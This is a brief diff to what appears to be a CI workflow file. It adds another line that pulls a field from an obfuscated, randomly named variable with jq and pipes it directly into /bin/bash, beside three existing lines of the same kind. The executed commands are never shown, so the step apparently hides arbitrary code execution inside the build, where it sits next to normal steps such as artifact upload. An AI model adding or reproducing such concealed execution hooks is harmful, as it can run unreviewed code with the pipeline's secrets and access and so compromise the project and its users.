@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$sj168" | jq -r .rigo66145 | /bin/bash
           echo $ustp6594 | jq -r .d3 | /bin/bash
           echo $gv37963 | jq -r .ewpl22395 | /bin/bash
+          echo $il95 | jq -r .epaam95430 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
